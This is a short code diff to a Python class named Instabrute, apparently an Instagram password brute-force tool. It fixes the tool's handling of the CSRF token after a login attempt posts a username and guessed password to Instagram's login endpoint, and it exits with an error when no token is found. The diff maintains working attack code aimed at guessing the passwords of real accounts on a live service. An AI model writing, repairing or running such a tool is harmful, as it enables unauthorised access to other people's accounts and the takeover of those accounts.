@@ -107,7 +107,12 @@ class Instabrute():
 
 		#Update token after login to the site 
 		r = sess.post('https://www.instagram.com/accounts/login/ajax/', data={'username':self.username, 'password':password}, allow_redirects=True)
-		sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})
+		csrf_token=r.cookies.get_dict().get('csrftoken')
+		if csrf_token:
+			sess.headers.update({'X-CSRFToken':csrf_token})
+		else:
+			print("Error:CSRF token not found")
+			exit()
 		
 		#parse response
 		data = json.loads(r.text)
